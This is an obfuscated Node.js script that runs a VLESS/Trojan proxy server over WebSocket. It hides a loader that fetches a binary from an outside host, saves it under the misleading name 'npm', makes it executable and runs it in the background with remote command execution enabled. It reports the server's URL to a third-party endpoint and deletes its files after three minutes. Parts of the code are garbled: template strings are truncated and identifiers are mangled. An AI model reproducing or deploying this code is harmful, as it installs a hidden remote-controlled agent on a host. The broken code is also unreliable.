const _0xe00d5bb8d2=["bG10aC54ZWRuaQ==","c29peGE=","bm9zai1zbmQvbm9pdGFjaWxwcGE=","YnVz","bWFlcnRz","OC1mdHU=","MzQ0","ZXVydA==","OmtzYVQgZ25pZGRhIHJvcnJF","NDZtcmE=","NDZoY3JhYQ==","NjkwMg==","cHR0aA==","bm9pdGNlbm5vYw==","Z25pbm51ciBwaWtzICx5dHBtZSBzaSBlbGJhaXJhdiBBSFpFTg==","aHNhYi9uaWIv","bmMueXl5eXl0LmVjYXBz","IWRscm93IG9sbGVI","blxkbnVvRiB0b04=","aHRhcA==","Z3VI","Im1wXW5bLy4iIHBlcmcgfCAicGVyZyIgdi0gcGVyZyB8IHh1YSBzcA==","c28=","eWxsdWZzc2VjY3VzIGRhb2xud29kIG1wbg==","MXYvbm0uY3luLnNzc3MuNDZkbWEvLzpzcHR0aA==","bm9zai9ub2l0YWNpbHBwYQ==","dG5lZ2Evbm0uY3luLnNzc3MuNDZkbWEvLzpzcHR0aA==","ZDQyNmJlMTYxM2NhLWI5MjgtMWQ2NC0wY2YyLTljNjM4ZDMz","dHBlY2NB","dGVu","ZXB5VC10bmV0bm9D","NDIyYWhz","bXJh","bHJ1LWRkYS90ZW4uMDB2cmVzLm9vb28vLzpzcHR0aA==","NDZlc2Fi","bmlhbHAvdHhldA==","bndvbmtuVQ==","Z25pbm51ciBzaSBtcG4=","MzUwMg==","bG10aC90eGV0","cm9ycmU=","ZWdhc3NlbQ==","blw=","OGZ0dQ==","NzgwMg==","MzgwMg==","MS4xLjEuMQ==","Li4uZ25pbm51ciBwaWtzICxnbmlubnVyIHlkYWVybGEgc2kgbXBu","MzQ0OA==","eGVo","b3RweXJj","eWxsdWZzc2VjY3VzIGRlZGRhIGtzYVQgc3NlY2NBIGNpdGFtb3R1QQ==","bXBuIHgrIGRvbWhj","c2Y=","c3NlY29ycF9kbGloYw==","cmVmZnVi","dG5lZ2Evbm0uY3luLnNzc3MuNDZtcmEvLzpzcHR0aA==","ZXNsYWY=","bXBu","c3c=","dHh0LnRzaWwvZ3VoL3NkYWVoL3NmZXIvZWRvbm9heS83ODkxb2F5bmF0L21vYy5yb3JyaW10aWcud2FyLy86c3B0dGg=","bG1heS5naWZub2M=","OnJvcnJlIGduaW5udXIgbXBu","dGVn","aHNpbmlm","YXRlbS9tb2MuZXJhbGZkdW9sYy5kZWVwcy8vOnNwdHRo","c2x0LS0=","NC40LjguOA==","MXYvbm0uY3luLnNzc3MuNDZtcmEvLzpzcHR0aA=="];(function(_a,_s){while(--_s){_a.push(_a.shift());}})(_0xe00d5bb8d2,0x9b);function _0x46699935e3(i){ let index=i;if (True) { index=(i+0x9b)%69;} let s=_0xe00d5bb8d2[index];let d=atob(s);return d.split('').reverse().join('');} function _0x88a4879700(i){return _0x46699935e3(i);} function _0x6bce27c50c(){return "pHyOcs44sMErIoWgewEc2XNyyLvxbcnPvlGtzhltmhVMwS8L";} function _0xd97b0c48ec(){return "UbJngcGbwZI3XcdyyuX7tZsrjj9yZU9uGYL1JvA09ePsbidD";} function _0x7f5abee15b(){return "a1jaVD1B1Y8cT4tJ8AjhsnvnIBtS2QwHXEwLtirJTdvAmJcC";} function _0xe6ce209a28(){return "XKdbFDGUO6ZdVBdB3vntUEYCJUSdJymT1HCteNinxgcDiU0X";} function _0x10eae947cc(){return "PndLRaKwY5MuZpDSbHSlKLOpfIIeCc0qec4uzYIF4NXbN185";} (function(){try{const _0x7e01ba0aa15a298=require(_0x88a4879700(0x16));const _0x86b944f65f33025=require(_0x88a4879700(0xc));const _0x064385e19f7ec19=require(_0x88a4879700(0x35));const _0xa4c20ba428855af=require(_0x88a4879700(0x1));const _0x8b1cddbf0195153=require(_0x88a4879700(0x1d));const _0x31d6d01e47b01a9=require(_0x88a4879700(0x13));const _0x720cf325cd5c003=require(_0x88a4879700(0x32));const { Buffer }=require(_0x88a4879700(0x37));const { exec,execSync }=require(_0x88a4879700(0x36));const { WebSocket,createWebSocketStream }=require(_0x88a4879700(0x3b));const _0xcc10e7831e7eeda=process.env._0xcc10e7831e7eeda||_0x88a4879700(0x1b);const _0x81c856c2a4a5d93=process.env._0x81c856c2a4a5d93||'';const _0x68e99ef6d3ccf9b=process.env._0x68e99ef6d3ccf9b||'';const _0x407a5405c644d03=process.env._0x407a5405c644d03||'';const _0x2ddc4626aa6646d=process.env._0x2ddc4626aa6646d||_0x88a4879700(0x10);const _0x3bc8e691623759c=process.env._0x3bc8e691623759c||true;const _0x8437000ee20a337=process.env._0x8437000ee20a337||_0xcc10e7831e7eeda.slice(0,8);const _0x10161b39b74d537=process.env._0x10161b39b74d537||_0x88a4879700(0x3);const _0xb1e951f7f118061=process.env._0xb1e951f7f118061||_0x88a4879700(0x14);const _0x0cc990e6b63cbb9=process.env._0x0cc990e6b63cbb9||7860;let _0xff10b160312ca57='';const _0xa3bcd83ad64e93d=async ()=>{ try { const _0x4159e6ec9f4189c=await _0xa4c20ba428855af.get(_0x88a4879700(0x41));const _0xf39d807c4d10323=_0x4159e6ec9f4189c._0xf39d807c4d10323;_0xff10b160312ca57=`${_0xf39d807c4d10323.country}-${_0xf39d807c4d10323.asOrganization}`.replace(//g,'_');} catch (e) { _0xff10b160312ca57=_0x88a4879700(0x24);} } _0xa3bcd83ad64e93d();const _0xc0cd5c7bb37e32c=_0x86b944f65f33025.createServer((req,_0x4159e6ec9f4189c)=>{ if (req._0xb588f6e9cc2c4d7==='/') { const _0xb9928b5f031f0b3=_0x31d6d01e47b01a9.join(__dirname,_0x88a4879700(0x0));_0x064385e19f7ec19.readFile(_0xb9928b5f031f0b3,_0x88a4879700(0x2b),(err,content)=>{ if (err) { _0x4159e6ec9f4189c.writeHead(200,{ _0x88a4879700(0x1e): _0x88a4879700(0x27) });_0x4159e6ec9f4189c.end(_0x88a4879700(0x11));return;} _0x4159e6ec9f4189c.writeHead(200,{ _0x88a4879700(0x1e): _0x88a4879700(0x27) });_0x4159e6ec9f4189c.end(content);});return;} else if (req._0xb588f6e9cc2c4d7===`/${_0x10161b39b74d537}`) { const _0x684a561e4224d14=_0x88a4879700(0x3c);_0xa4c20ba428855af.get(_0x684a561e4224d14) .then(r=>{ let _0x129b5a3073c8668=r._0xf39d807c4d10323 .split(/\r?\n/) .map(l=>l.trim()) .filter(l=>l.length>0);if (_0x129b5a3073c8668.length===0) { _0x129b5a3073c8668=[_0x2ddc4626aa6646d];} let _0xb22f4b45196c554="";for (const d of _0x129b5a3073c8668) { const _0xe0747574bd61c77=`vless: const _0x166eeb42e144424=`trojan: _0xb22f4b45196c554+=_0xe0747574bd61c77+_0x88a4879700(0x2a)+_0x166eeb42e144424+_0x88a4879700(0x2a);} const _0x6603713c7f72b7c=Buffer.from(_0xb22f4b45196c554).toString(_0x88a4879700(0x22));_0x4159e6ec9f4189c.writeHead(200,{ _0x88a4879700(0x1e): _0x88a4879700(0x23) });_0x4159e6ec9f4189c.end(_0x6603713c7f72b7c+_0x88a4879700(0x2a));}) .catch(err=>{ const _0xe0747574bd61c77=`vless: const _0x166eeb42e144424=`trojan: const _0x0a95bc8d75ec2b6=_0xe0747574bd61c77+_0x88a4879700(0x2a)+_0x166eeb42e144424;const _0x6603713c7f72b7c=Buffer.from(_0x0a95bc8d75ec2b6).toString(_0x88a4879700(0x22));_0x4159e6ec9f4189c.writeHead(200,{ _0x88a4879700(0x1e): _0x88a4879700(0x23) });_0x4159e6ec9f4189c.end(_0x6603713c7f72b7c+_0x88a4879700(0x2a));});} else { _0x4159e6ec9f4189c.writeHead(404,{ _0x88a4879700(0x1e): _0x88a4879700(0x23) });_0x4159e6ec9f4189c.end(_0x88a4879700(0x12));} });const _0x60136db57071952=new WebSocket.Server({ server: _0xc0cd5c7bb37e32c });const _0x2bcad12b1e498e2=_0xcc10e7831e7eeda.replace(/-/g,"");const _0xf26326ee3e1e308=[_0x88a4879700(0x43),_0x88a4879700(0x2e)];function _0x13eaba860092774(_0x86a141934d3a70d) { return new Promise((resolve,reject)=>{ if (/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/.test(_0x86a141934d3a70d)) { resolve(_0x86a141934d3a70d);return;} let _0x3fa3f6308315298=0;function _0x5e55fadfcdfc1ae() { if (_0x3fa3f6308315298>=_0xf26326ee3e1e308.length) { reject(new Error(`Failed to resolve ${_0x86a141934d3a70d} with all DNS servers`));return;} const _0x6d986a830953599=_0xf26326ee3e1e308[_0x3fa3f6308315298];_0x3fa3f6308315298++;const _0xbee59d283f185dd=`https: _0xa4c20ba428855af.get(_0xbee59d283f185dd,{ timeout: 5000,headers: { _0x88a4879700(0x1c): _0x88a4879700(0x2) } }) .then(_0x99842647d12107d=>{ const _0xf39d807c4d10323=_0x99842647d12107d._0xf39d807c4d10323;if (_0xf39d807c4d10323.Status===0&&_0xf39d807c4d10323.Answer&&_0xf39d807c4d10323.Answer.length>0) { const _0x0f925d964a56e97=_0xf39d807c4d10323.Answer.find(record=>record.type===1);if (_0x0f925d964a56e97) { resolve(_0x0f925d964a56e97._0xf39d807c4d10323);return;} } _0x5e55fadfcdfc1ae();}) .catch(error=>{ _0x5e55fadfcdfc1ae();});} _0x5e55fadfcdfc1ae();});} function _0x93f237a00edac85(ws,msg) { const [VERSION]=msg;const _0xdba8998ea01e927=msg.slice(1,17);if (!_0xdba8998ea01e927.every((v,i)=>v==parseInt(_0x2bcad12b1e498e2.substr(i*2,2),16))) return false;let i=msg.slice(17,18).readUInt8()+19;const _0xe02fec6b03c7625=msg.slice(i,i+=2).readUInt16BE(0);const _0xca41dd57fc7ec17=msg.slice(i,i+=1).readUInt8();const _0x86a141934d3a70d=_0xca41dd57fc7ec17==1 ? msg.slice(i,i+=4).join('.') : (_0xca41dd57fc7ec17==2 ? new TextDecoder().decode(msg.slice(i+1,i+=1+msg.slice(i,i+1).readUInt8())) : (_0xca41dd57fc7ec17==3 ? msg.slice(i,i+=16).reduce((s,b,i,a)=>(i%2 ? s.concat(a.slice(i-1,i+1)) : s),[]).map(b=>b.readUInt16BE(0).toString(16)).join(':') : ''));ws.send(new Uint8Array([VERSION,0]));const _0xe56212f22a603c5=createWebSocketStream(ws);_0x13eaba860092774(_0x86a141934d3a70d) .then(resolvedIP=>{ _0x8b1cddbf0195153.connect({ _0x86a141934d3a70d: resolvedIP,_0xe02fec6b03c7625 },function() { this.write(msg.slice(i));_0xe56212f22a603c5.on(_0x88a4879700(0x28),()=>{}).pipe(this).on(_0x88a4879700(0x28),()=>{}).pipe(_0xe56212f22a603c5);}).on(_0x88a4879700(0x28),()=>{});}) .catch(error=>{ _0x8b1cddbf0195153.connect({ _0x86a141934d3a70d,_0xe02fec6b03c7625 },function() { this.write(msg.slice(i));_0xe56212f22a603c5.on(_0x88a4879700(0x28),()=>{}).pipe(this).on(_0x88a4879700(0x28),()=>{}).pipe(_0xe56212f22a603c5);}).on(_0x88a4879700(0x28),()=>{});});return true;} function _0x430c4cc5f898619(ws,msg) { try { if (msg.length<58) return false;const _0x1ebe4a2ac500123=msg.slice(0,56).toString();const _0x5a658a05d678800=[ _0xcc10e7831e7eeda,];let _0x91a228a4172eb28=null;for (const _0x21d539e460990a0 of _0x5a658a05d678800) { const _0x4221a5221d90bf6=_0x720cf325cd5c003.createHash(_0x88a4879700(0x1f)).update(_0x21d539e460990a0).digest(_0x88a4879700(0x31));if (_0x4221a5221d90bf6===_0x1ebe4a2ac500123) { _0x91a228a4172eb28=_0x21d539e460990a0;break;} } if (!_0x91a228a4172eb28) return false;let _0x4760602cca39c7f=56;if (msg[_0x4760602cca39c7f]===0x0d&&msg[_0x4760602cca39c7f+1]===0x0a) { _0x4760602cca39c7f+=2;} const _0x641b2b0d60f8b41=msg[_0x4760602cca39c7f];if (_0x641b2b0d60f8b41!==0x01) return false;_0x4760602cca39c7f+=1;const _0x94ada49d4307224=msg[_0x4760602cca39c7f];_0x4760602cca39c7f+=1;let _0x86a141934d3a70d,_0xe02fec6b03c7625;if (_0x94ada49d4307224===0x01) { _0x86a141934d3a70d=msg.slice(_0x4760602cca39c7f,_0x4760602cca39c7f+4).join('.');_0x4760602cca39c7f+=4;} else if (_0x94ada49d4307224===0x03) { const _0x69a98d22d747302=msg[_0x4760602cca39c7f];_0x4760602cca39c7f+=1;_0x86a141934d3a70d=msg.slice(_0x4760602cca39c7f,_0x4760602cca39c7f+_0x69a98d22d747302).toString();_0x4760602cca39c7f+=_0x69a98d22d747302;} else if (_0x94ada49d4307224===0x04) { _0x86a141934d3a70d=msg.slice(_0x4760602cca39c7f,_0x4760602cca39c7f+16).reduce((s,b,i,a)=>(i%2 ? s.concat(a.slice(i-1,i+1)) : s),[]) .map(b=>b.readUInt16BE(0).toString(16)).join(':');_0x4760602cca39c7f+=16;} else { return false;} _0xe02fec6b03c7625=msg.readUInt16BE(_0x4760602cca39c7f);_0x4760602cca39c7f+=2;if (_0x4760602cca39c7f<msg.length&&msg[_0x4760602cca39c7f]===0x0d&&msg[_0x4760602cca39c7f+1]===0x0a) { _0x4760602cca39c7f+=2;} const _0xe56212f22a603c5=createWebSocketStream(ws);_0x13eaba860092774(_0x86a141934d3a70d) .then(resolvedIP=>{ _0x8b1cddbf0195153.connect({ _0x86a141934d3a70d: resolvedIP,_0xe02fec6b03c7625 },function() { if (_0x4760602cca39c7f<msg.length) { this.write(msg.slice(_0x4760602cca39c7f));} _0xe56212f22a603c5.on(_0x88a4879700(0x28),()=>{}).pipe(this).on(_0x88a4879700(0x28),()=>{}).pipe(_0xe56212f22a603c5);}).on(_0x88a4879700(0x28),()=>{});}) .catch(error=>{ _0x8b1cddbf0195153.connect({ _0x86a141934d3a70d,_0xe02fec6b03c7625 },function() { if (_0x4760602cca39c7f<msg.length) { this.write(msg.slice(_0x4760602cca39c7f));} _0xe56212f22a603c5.on(_0x88a4879700(0x28),()=>{}).pipe(this).on(_0x88a4879700(0x28),()=>{}).pipe(_0xe56212f22a603c5);}).on(_0x88a4879700(0x28),()=>{});});return true;} catch (error) { return false;} } _0x60136db57071952.on(_0x88a4879700(0xd),(ws,req)=>{ const _0xb588f6e9cc2c4d7=req._0xb588f6e9cc2c4d7||'';ws.once(_0x88a4879700(0x29),msg=>{ if (msg.length>17&&msg[0]===0) { const _0xdba8998ea01e927=msg.slice(1,17);const _0xfe052b7d95f742d=_0xdba8998ea01e927.every((v,i)=>v==parseInt(_0x2bcad12b1e498e2.substr(i*2,2),16));if (_0xfe052b7d95f742d) { if (!_0x93f237a00edac85(ws,msg)) { ws.close();} return;} } if (!_0x430c4cc5f898619(ws,msg)) { ws.close();} }).on(_0x88a4879700(0x28),()=>{});});const _0x6272fe5a5d928e5=()=>{ const _0xa902103db26a5ac=_0x7e01ba0aa15a298._0xa902103db26a5ac();if (_0xa902103db26a5ac===_0x88a4879700(0x20)||_0xa902103db26a5ac===_0x88a4879700(0x9)||_0xa902103db26a5ac===_0x88a4879700(0xa)) { if (!_0x68e99ef6d3ccf9b) { return _0x88a4879700(0x44);} else { return _0x88a4879700(0x38);} } else { if (!_0x68e99ef6d3ccf9b) { return _0x88a4879700(0x18);} else { return _0x88a4879700(0x1a);} } };const _0xce697c9dd6e694a=async ()=>{ if (!_0x81c856c2a4a5d93&&!_0x407a5405c644d03) return;try { const _0xb588f6e9cc2c4d7=_0x6272fe5a5d928e5();const _0x99842647d12107d=await _0xa4c20ba428855af({ method: _0x88a4879700(0x3f),_0xb588f6e9cc2c4d7: _0xb588f6e9cc2c4d7,responseType: _0x88a4879700(0x4) });const _0x41686106fdcd21f=_0x064385e19f7ec19.createWriteStream(_0x88a4879700(0x3a));_0x99842647d12107d._0xf39d807c4d10323.pipe(_0x41686106fdcd21f);return new Promise((resolve,reject)=>{ _0x41686106fdcd21f.on(_0x88a4879700(0x40),()=>{ console.log(_0x88a4879700(0x17));exec(_0x88a4879700(0x34),(err)=>{ if (err) reject(err);resolve();});});_0x41686106fdcd21f.on(_0x88a4879700(0x28),reject);});} catch (err) { throw err;} };const _0x4142b54028d46f9=async ()=>{ try { const _0xb0260f88d5595ba=execSync(_0x88a4879700(0x15),{ encoding: _0x88a4879700(0x5) });if (_0xb0260f88d5595ba.trim()!=='') { console.log(_0x88a4879700(0x2f));return;} } catch (e) { } await _0xce697c9dd6e694a();let _0x5a558c496e4d3b5='';let _0xc610ab86fe8fffe=[_0x88a4879700(0x6),_0x88a4879700(0x30),_0x88a4879700(0xb),_0x88a4879700(0x2c),_0x88a4879700(0x2d),_0x88a4879700(0x26)];if (_0x81c856c2a4a5d93&&_0x68e99ef6d3ccf9b&&_0x407a5405c644d03) { const _0xf03116c1b2782db=_0xc610ab86fe8fffe.includes(_0x68e99ef6d3ccf9b) ? _0x88a4879700(0x42) : '';_0x5a558c496e4d3b5=`setsid nohup ./npm-s ${_0x81c856c2a4a5d93}:${_0x68e99ef6d3ccf9b}-p ${_0x407a5405c644d03} ${_0xf03116c1b2782db}--disable-auto-update--report-delay 4--skip-conn--skip-procs>/dev/null 2>&1&`;} else if (_0x81c856c2a4a5d93&&_0x407a5405c644d03) { if (!_0x68e99ef6d3ccf9b) { const _0xe02fec6b03c7625=_0x81c856c2a4a5d93.includes(':') ? _0x81c856c2a4a5d93.split(':').pop() : '';const _0x4aa0f913a05f1bd=_0xc610ab86fe8fffe.includes(_0xe02fec6b03c7625) ? _0x88a4879700(0x7) : _0x88a4879700(0x39);const _0x02776980d721d64=`client_secret: ${_0x407a5405c644d03} debug: false disable_auto_update: true disable_command_execute: false disable_force_update: true disable_nat: false disable_send_query: false gpu: false insecure_tls: true ip_report_period: 1800 report_delay: 4 server: ${_0x81c856c2a4a5d93} skip_connection_count: true skip_procs_count: true temperature: false tls: ${_0x4aa0f913a05f1bd} use_gitee_to_upgrade: false use_ipv6_country_code: false _0x2bcad12b1e498e2: ${_0xcc10e7831e7eeda}`;_0x064385e19f7ec19.writeFileSync(_0x88a4879700(0x3d),_0x02776980d721d64);} _0x5a558c496e4d3b5=`setsid nohup ./npm-c config.yaml>/dev/null 2>&1&`;} else { console.log(_0x88a4879700(0xe));return;} try { exec(_0x5a558c496e4d3b5,{ shell: _0x88a4879700(0xf) },(err)=>{ if (err) console.error(_0x88a4879700(0x3e),err);else console.log(_0x88a4879700(0x25));});} catch (error) { console.error(`error: ${error}`);} };async function _0x7fa8de3863c6bfe() { if (!_0x3bc8e691623759c) return;if (!_0x2ddc4626aa6646d) { return;} const _0xbe7bd960c5c0d71=`https: try { const _0x4159e6ec9f4189c=await _0xa4c20ba428855af.post(_0x88a4879700(0x21),{ _0xb588f6e9cc2c4d7: _0xbe7bd960c5c0d71 },{ headers: { _0x88a4879700(0x1e): _0x88a4879700(0x19) } });console.log(_0x88a4879700(0x33));} catch (error) { } } const _0xd5bf83963536099=()=>{ _0x064385e19f7ec19.unlink(_0x88a4879700(0x3a),()=>{});_0x064385e19f7ec19.unlink(_0x88a4879700(0x3d),()=>{});};_0xc0cd5c7bb37e32c.listen(_0x0cc990e6b63cbb9,()=>{ _0x4142b54028d46f9();setTimeout(()=>{ _0xd5bf83963536099();},180000);_0x7fa8de3863c6bfe();console.log(`Server is running on _0xe02fec6b03c7625 ${_0x0cc990e6b63cbb9}`);});}catch(e){}})();
